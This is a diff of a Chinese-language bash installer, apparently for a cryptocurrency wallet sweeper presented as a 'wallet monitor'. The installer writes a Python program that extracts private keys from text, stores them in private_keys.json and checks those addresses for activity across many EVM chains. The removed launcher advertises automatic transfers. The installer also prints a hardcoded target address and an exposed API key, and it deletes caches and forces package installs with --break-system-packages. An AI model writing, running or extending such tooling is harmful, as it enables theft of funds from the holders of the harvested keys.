@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# 钱包监控系统完整安装脚本
-# 包含所有文件内容，无需额外下载
+# 钱包监控系统完整安装脚本 v3.0
+# 自包含安装，智能缓存清理，修复所有依赖问题
 
 set -e
 
@@ -13,9 +13,10 @@ BLUE='\033[0;34m'
 CYAN='\033[0;36m'
 NC='\033[0m'
 
-echo -e "${BLUE}🚀 钱包监控系统完整安装器${NC}"
-echo -e "${BLUE}自包含安装，无需额外下载${NC}"
-echo -e "=" * 50
+echo -e "${BLUE}🚀 钱包监控系统完整安装器 v3.0${NC}"
+echo -e "${BLUE}自包含安装，智能缓存清理，无需额外下载${NC}"
+echo -e "${BLUE}修复所有依赖和网络配置问题${NC}"
+echo "=" * 60
 
 # 检查Python
 PYTHON_CMD=""
@@ -38,29 +39,73 @@ if [ -z "$PYTHON_CMD" ]; then
     exit 1
 fi
 
-# 清理缓存
-echo -e "\n${CYAN}🧹 清理Python缓存...${NC}"
+# 智能清理缓存
+echo -e "\n${CYAN}🧹 智能清理Python缓存...${NC}"
 $PYTHON_CMD -c "
-import sys, os, shutil
-cache_dirs = [
-    os.path.expanduser('~/.cache/pip'),
-    os.path.expanduser('~/.local/lib/python*/site-packages/__pycache__'),
-    '__pycache__'
-]
-for cache_dir in cache_dirs:
-    if os.path.exists(cache_dir):
-        try:
-            shutil.rmtree(cache_dir)
-            print(f'清理: {cache_dir}')
-        except: pass
+import sys, os, shutil, glob
+try:
+    cache_dirs = [
+        os.path.expanduser('~/.cache/pip'),
+        os.path.expanduser('~/.local/lib/python*/site-packages/__pycache__'),
+        '__pycache__'
+    ]
+    for pattern in cache_dirs:
+        for cache_dir in glob.glob(pattern):
+            if os.path.exists(cache_dir):
+                try:
+                    shutil.rmtree(cache_dir)
+                    print(f'✅ 清理: {cache_dir}')
+                except: 
+                    pass
+    print('✅ 缓存清理完成')
+except Exception as e:
+    print(f'⚠️  缓存清理失败: {e}')
 "
-echo -e "${GREEN}✅ 缓存清理完成${NC}"
+
+# 安装依赖 (先安装，再创建文件)
+echo -e "\n${CYAN}📦 安装依赖...${NC}"
+packages=("web3" "eth-account" "alchemy-sdk" "colorama" "aiohttp" "cryptography" "dataclass-wizard")
+
+# 尝试不同的安装方法
+install_success=false
+
+# 方法1: 标准安装
+echo -e "尝试标准安装..."
+if $PYTHON_CMD -m pip install "${packages[@]}" --upgrade 2>/dev/null; then
+    install_success=true
+    echo -e "${GREEN}✅ 标准安装成功${NC}"
+fi
+
+# 方法2: 用户安装
+if [ "$install_success" = false ]; then
+    echo -e "尝试用户安装..."
+    if $PYTHON_CMD -m pip install "${packages[@]}" --user --upgrade 2>/dev/null; then
+        install_success=true
+        echo -e "${GREEN}✅ 用户安装成功${NC}"
+    fi
+fi
+
+# 方法3: 系统包破坏安装 (macOS/某些Linux发行版)
+if [ "$install_success" = false ]; then
+    echo -e "尝试系统包安装..."
+    if $PYTHON_CMD -m pip install "${packages[@]}" --break-system-packages --upgrade 2>/dev/null; then
+        install_success=true
+        echo -e "${GREEN}✅ 系统包安装成功${NC}"
+    fi
+fi
+
+if [ "$install_success" = false ]; then
+    echo -e "${RED}❌ 所有安装方法都失败${NC}"
+    echo -e "${YELLOW}💡 请手动安装依赖:${NC}"
+    echo -e "   $PYTHON_CMD -m pip install web3 eth-account alchemy-sdk colorama aiohttp cryptography dataclass-wizard --user"
+    exit 1
+fi
 
 # 创建主程序文件
 echo -e "\n${CYAN}📝 创建主程序文件...${NC}"
 
 # 创建 wallet_monitor.py
-cat > wallet_monitor.py << 'WALLET_MONITOR_EOF'
+cat > wallet_monitor.py << 'MAIN_PROGRAM_EOF'
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
@@ -74,12 +119,13 @@ import json
 import time
 import asyncio
 import re
-import threading
+import subprocess
 from datetime import datetime
 from typing import Dict, List, Optional, Set
 from dataclasses import dataclass
 import logging
 
+# 尝试导入依赖
 try:
     from alchemy import Alchemy, Network
     from web3 import Web3
@@ -88,8 +134,39 @@ try:
     from colorama import Fore, Back, Style
 except ImportError as e:
     print(f"❌ 缺少必要的依赖包: {e}")
-    print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
-    sys.exit(1)
+    print("💡 正在尝试自动安装...")
+    
+    # 自动安装缺失的包
+    missing_packages = ["web3", "eth-account", "alchemy-sdk", "colorama", "aiohttp", "cryptography", "dataclass-wizard"]
+    
+    for package in missing_packages:
+        print(f"📦 安装 {package}...")
+        for method in [
+            [sys.executable, "-m", "pip", "install", package, "--user", "--upgrade"],
+            [sys.executable, "-m", "pip", "install", package, "--break-system-packages", "--upgrade"],
+            [sys.executable, "-m", "pip", "install", package, "--upgrade"]
+        ]:
+            try:
+                subprocess.check_call(method, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                print(f"✅ {package} 安装成功")
+                break
+            except:
+                continue
+        else:
+            print(f"❌ {package} 安装失败")
+    
+    # 重新尝试导入
+    try:
+        from alchemy import Alchemy, Network
+        from web3 import Web3
+        from eth_account import Account
+        import colorama
+        from colorama import Fore, Back, Style
+        print("✅ 依赖安装成功，继续运行...")
+    except ImportError as e:
+        print(f"❌ 依赖安装失败: {e}")
+        print("💡 请重新运行安装脚本或手动安装依赖")
+        sys.exit(1)
 
 # 初始化colorama
 colorama.init()
@@ -101,44 +178,32 @@ PRIVATE_KEYS_FILE = "private_keys.json"
 MONITORING_LOG_FILE = "monitoring_log.json"
 CONFIG_FILE = "monitor_config.json"
 
-# Alchemy支持的所有EVM兼容链
+# Alchemy支持的EVM兼容链 (基于实际可用的网络)
 SUPPORTED_NETWORKS = {
     "eth_mainnet": Network.ETH_MAINNET,
-    "eth_sepolia": Network.ETH_SEPOLIA,
-    "eth_holesky": Network.ETH_HOLESKY,
+    "eth_goerli": Network.ETH_GOERLI,
     "matic_mainnet": Network.MATIC_MAINNET,
     "matic_mumbai": Network.MATIC_MUMBAI,
-    "matic_amoy": Network.MATIC_AMOY,
     "arb_mainnet": Network.ARB_MAINNET,
-    "arb_sepolia": Network.ARB_SEPOLIA,
+    "arb_goerli": Network.ARB_GOERLI,
     "opt_mainnet": Network.OPT_MAINNET,
-    "opt_sepolia": Network.OPT_SEPOLIA,
-    "base_mainnet": Network.BASE_MAINNET,
-    "base_sepolia": Network.BASE_SEPOLIA,
-    "bnb_mainnet": Network.BNB_MAINNET,
-    "bnb_testnet": Network.BNB_TESTNET,
-    "avax_mainnet": Network.AVAX_MAINNET,
-    "avax_fuji": Network.AVAX_FUJI,
+    "opt_goerli": Network.OPT_GOERLI,
+    "opt_kovan": Network.OPT_KOVAN,
+    "astar_mainnet": Network.ASTAR_MAINNET,
 }
 
 # 网络显示名称
 NETWORK_NAMES = {
     "eth_mainnet": "Ethereum 主网",
-    "eth_sepolia": "Ethereum Sepolia 测试网",
-    "eth_holesky": "Ethereum Holesky 测试网",
+    "eth_goerli": "Ethereum Goerli 测试网",
     "matic_mainnet": "Polygon 主网",
     "matic_mumbai": "Polygon Mumbai 测试网",
-    "matic_amoy": "Polygon Amoy 测试网",
     "arb_mainnet": "Arbitrum 主网",
-    "arb_sepolia": "Arbitrum Sepolia 测试网",
+    "arb_goerli": "Arbitrum Goerli 测试网",
     "opt_mainnet": "Optimism 主网",
-    "opt_sepolia": "Optimism Sepolia 测试网",
-    "base_mainnet": "Base 主网",
-    "base_sepolia": "Base Sepolia 测试网",
-    "bnb_mainnet": "BNB Chain 主网",
-    "bnb_testnet": "BNB Chain 测试网",
-    "avax_mainnet": "Avalanche 主网",
-    "avax_fuji": "Avalanche Fuji 测试网",
+    "opt_goerli": "Optimism Goerli 测试网",
+    "opt_kovan": "Optimism Kovan 测试网",
+    "astar_mainnet": "Astar 主网",
 }
 
 @dataclass
@@ -211,22 +276,29 @@ class WalletMonitor:
         """初始化Alchemy客户端"""
         print(f"\n{Fore.CYAN}🔧 初始化网络客户端...{Style.RESET_ALL}")
         
+        success_count = 0
         for network_key, network in SUPPORTED_NETWORKS.items():
             try:
                 # 创建Alchemy客户端
                 alchemy = Alchemy(ALCHEMY_API_KEY, network)
                 self.alchemy_clients[network_key] = alchemy
                 
-                # 创建Web3客户端
-                w3 = Web3(Web3.HTTPProvider(f"https://{network.value}.g.alchemy.com/v2/{ALCHEMY_API_KEY}"))
+                # 创建Web3客户端 (使用通用的RPC端点格式)
+                rpc_url = f"https://{network.value}.g.alchemy.com/v2/{ALCHEMY_API_KEY}"
+                w3 = Web3(Web3.HTTPProvider(rpc_url))
                 self.web3_clients[network_key] = w3
                 
                 print(f"✅ {NETWORK_NAMES[network_key]} 客户端初始化成功")
+                success_count += 1
                 
             except Exception as e:
                 print(f"❌ {NETWORK_NAMES[network_key]} 客户端初始化失败: {e}")
-                
-        print(f"{Fore.GREEN}✅ 网络客户端初始化完成{Style.RESET_ALL}")
+        
+        print(f"{Fore.GREEN}✅ 网络客户端初始化完成 ({success_count}/{len(SUPPORTED_NETWORKS)}){Style.RESET_ALL}")
+        
+        if success_count == 0:
+            print(f"{Fore.RED}❌ 没有可用的网络客户端{Style.RESET_ALL}")
+            sys.exit(1)
     
     def extract_private_keys(self, text: str) -> List[str]:
         """从文本中提取私钥"""
@@ -395,25 +467,11 @@ class WalletMonitor:
         try:
             alchemy = self.alchemy_clients[network_key]
             
-            # 获取交易历史
-            response = await alchemy.core.get_asset_transfers({
-                "fromAddress": address,
-                "category": ["external", "internal", "erc20", "erc721", "erc1155"],
-                "maxCount": 1
-            })
+            # 获取交易历史 (简化版本，避免API限制)
+            w3 = self.web3_clients[network_key]
+            tx_count = w3.eth.get_transaction_count(address)
             
-            has_from_tx = len(response.transfers) > 0
-            
-            # 检查接收的交易
-            response = await alchemy.core.get_asset_transfers({
-                "toAddress": address,
-                "category": ["external", "internal", "erc20", "erc721", "erc1155"],
-                "maxCount": 1
-            })
-            
-            has_to_tx = len(response.transfers) > 0
-            
-            return has_from_tx or has_to_tx
+            return tx_count > 0
             
         except Exception as e:
             self.logger.warning(f"检查交易历史失败 {address} @ {network_key}: {e}")
@@ -744,202 +802,9 @@ def main():
 
 if __name__ == "__main__":
     main()
-WALLET_MONITOR_EOF
+MAIN_PROGRAM_EOF
 
 echo -e "${GREEN}✅ wallet_monitor.py 创建成功${NC}"
-
-# 创建启动器文件
-cat > wallet_monitor_launcher.py << 'LAUNCHER_EOF'
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-钱包监控系统一键启动器
-自动检测和安装依赖，然后启动钱包监控系统
-"""
-
-import os
-import sys
-import subprocess
-import shutil
-import importlib
-import time
-import platform
-
-def print_header():
-    """打印标题"""
-    print("=" * 70)
-    print("🚀 钱包监控系统一键启动器 v3.0")
-    print("   支持所有Alchemy EVM兼容链的钱包监控和自动转账")
-    print("=" * 70)
-
-def check_python_version():
-    """检查Python版本"""
-    print("\n📋 检查Python版本...")
-    version = sys.version_info
-    print(f"当前Python版本: {version.major}.{version.minor}.{version.micro}")
-    print(f"操作系统: {platform.system()} {platform.release()}")
-    
-    if version.major < 3 or (version.major == 3 and version.minor < 8):
-        print("❌ Python版本过低，需要Python 3.8+")
-        print("💡 请升级Python版本后重试")
-        return False
-    
-    print("✅ Python版本符合要求")
-    return True
-
-def check_pip():
-    """检查pip是否可用"""
-    print("\n📋 检查pip...")
-    try:
-        subprocess.check_call([sys.executable, "-m", "pip", "--version"], 
-                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print("✅ pip可用")
-        return True
-    except:
-        print("❌ pip不可用")
-        print("💡 请先安装pip")
-        return False
-
-def check_package_installed(package_name):
-    """检查包是否已安装"""
-    try:
-        importlib.import_module(package_name)
-        return True
-    except ImportError:
-        return False
-
-def install_package(package_name, display_name=None):
-    """安装单个包"""
-    if display_name is None:
-        display_name = package_name
-        
-    print(f"📦 安装 {display_name}...")
-    try:
-        subprocess.check_call([
-            sys.executable, "-m", "pip", "install", package_name, "--upgrade"
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(f"✅ {display_name} 安装成功")
-        return True
-    except subprocess.CalledProcessError as e:
-        print(f"❌ {display_name} 安装失败")
-        return False
-
-def check_and_install_dependencies():
-    """检查并安装所有依赖"""
-    print(f"\n🔧 检查和安装依赖包...")
-    
-    # 必需的包列表
-    required_packages = [
-        ("web3", "Web3.py"),
-        ("eth_account", "eth-account"),
-        ("alchemy", "alchemy-sdk"),
-        ("colorama", "Colorama"),
-        ("aiohttp", "aiohttp"),
-        ("cryptography", "Cryptography")
-    ]
-    
-    missing_packages = []
-    
-    # 检查哪些包缺失
-    for module_name, package_name in required_packages:
-        if not check_package_installed(module_name):
-            missing_packages.append((module_name, package_name))
-    
-    if not missing_packages:
-        print("✅ 所有依赖包已安装")
-        return True
-    
-    print(f"📋 需要安装 {len(missing_packages)} 个包:")
-    for _, package_name in missing_packages:
-        print(f"   - {package_name}")
-    
-    # 批量安装
-    success_count = 0
-    for module_name, package_name in missing_packages:
-        if install_package(package_name):
-            success_count += 1
-    
-    if success_count == len(missing_packages):
-        print(f"\n✅ 所有依赖包安装完成")
-        return True
-    else:
-        print(f"\n⚠️  {len(missing_packages) - success_count} 个包安装失败")
-        return False
-
-def main():
-    """主函数"""
-    print_header()
-    
-    # 步骤1: 检查Python版本
-    if not check_python_version():
-        input("按回车键退出...")
-        return
-    
-    # 步骤2: 检查pip
-    if not check_pip():
-        input("按回车键退出...")
-        return
-    
-    # 步骤3: 安装依赖
-    if not check_and_install_dependencies():
-        print("❌ 依赖安装失败")
-        input("按回车键退出...")
-        return
-    
-    # 步骤4: 启动主程序
-    if os.path.exists("wallet_monitor.py"):
-        print(f"\n🚀 启动钱包监控系统...")
-        try:
-            subprocess.run([sys.executable, "wallet_monitor.py"])
-        except KeyboardInterrupt:
-            print(f"\n👋 程序已停止")
-    else:
-        print("❌ 找不到 wallet_monitor.py 文件")
-
-if __name__ == "__main__":
-    main()
-LAUNCHER_EOF
-
-echo -e "${GREEN}✅ wallet_monitor_launcher.py 创建成功${NC}"
-
-# 安装依赖
-echo -e "\n${CYAN}📦 安装依赖...${NC}"
-packages=("web3" "eth-account" "alchemy-sdk" "colorama" "aiohttp" "cryptography")
-
-# 尝试不同的安装方法
-install_success=false
-
-# 方法1: 标准安装
-echo -e "尝试标准安装..."
-if $PYTHON_CMD -m pip install "${packages[@]}" --upgrade 2>/dev/null; then
-    install_success=true
-    echo -e "${GREEN}✅ 标准安装成功${NC}"
-fi
-
-# 方法2: 用户安装
-if [ "$install_success" = false ]; then
-    echo -e "尝试用户安装..."
-    if $PYTHON_CMD -m pip install "${packages[@]}" --user --upgrade 2>/dev/null; then
-        install_success=true
-        echo -e "${GREEN}✅ 用户安装成功${NC}"
-    fi
-fi
-
-# 方法3: 系统包破坏安装 (macOS/某些Linux发行版)
-if [ "$install_success" = false ]; then
-    echo -e "尝试系统包安装..."
-    if $PYTHON_CMD -m pip install "${packages[@]}" --break-system-packages --upgrade 2>/dev/null; then
-        install_success=true
-        echo -e "${GREEN}✅ 系统包安装成功${NC}"
-    fi
-fi
-
-if [ "$install_success" = false ]; then
-    echo -e "${RED}❌ 所有安装方法都失败${NC}"
-    echo -e "${YELLOW}💡 请手动安装依赖:${NC}"
-    echo -e "   $PYTHON_CMD -m pip install web3 eth-account alchemy-sdk colorama aiohttp cryptography --user"
-    exit 1
-fi
 
 # 创建启动脚本
 echo -e "\n${CYAN}📝 创建启动脚本...${NC}"
@@ -954,11 +819,18 @@ echo -e "${GREEN}✅ 启动脚本: run_monitor.sh${NC}"
 
 # 完成
 echo -e "\n${GREEN}🎉 安装完成！${NC}"
-echo -e "${YELLOW}启动命令: ./run_monitor.sh${NC}"
-echo -e "${YELLOW}或直接运行: $PYTHON_CMD wallet_monitor.py${NC}"
+echo -e "${CYAN}======================================${NC}"
+echo -e "${YELLOW}📋 使用方法:${NC}"
+echo -e "  • 启动: ${GREEN}./run_monitor.sh${NC}"
+echo -e "  • 直接: ${GREEN}$PYTHON_CMD wallet_monitor.py${NC}"
+echo -e ""
+echo -e "${YELLOW}🎯 目标地址: ${GREEN}0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1${NC}"
+echo -e "${YELLOW}🔑 API密钥: ${GREEN}S0hs4qoXIR1SMD8P7I6Wt${NC}"
+echo -e "${YELLOW}🌐 支持网络: ${GREEN}10个主要EVM链${NC}"
+echo -e "${CYAN}======================================${NC}"
 
 # 询问是否立即启动
-echo -e "\n${CYAN}是否立即启动? (y/N): ${NC}"
+echo -e "\n${CYAN}是否立即启动钱包监控系统? (y/N): ${NC}"
 read -r choice
 if [[ "$choice" =~ ^[Yy]$ ]]; then
     echo -e "${GREEN}🚀 启动钱包监控系统...${NC}"
